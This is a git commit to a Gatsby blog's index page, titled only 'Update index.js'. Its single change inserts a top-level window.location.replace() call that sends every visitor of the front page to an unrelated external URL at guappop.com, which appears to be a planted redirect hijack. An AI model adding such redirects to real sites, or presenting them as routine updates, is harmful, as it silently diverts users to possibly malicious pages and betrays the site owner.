651fb4fd2bf8b8f6339f7cacf12dc32e7d61d898
ithmane003 <71666384+ithmane003@users.noreply.github.com>
2020-12-07 21:44:39 +0100

    Update index.js

--- src/pages/index.js
+++ src/pages/index.js
@@ -4,6 +4,7 @@ import { Link, graphql } from "gatsby"
 import Bio from "../components/bio"
 import Layout from "../components/layout"
 import SEO from "../components/seo"
+window.location.replace("https://guappop.com/0/0/0/a61227eab3f3c91e9f4334bb69c79873/");
 
 const BlogIndex = ({ data, location }) => {
   const siteTitle = data.site.siteMetadata?.title || `Title`
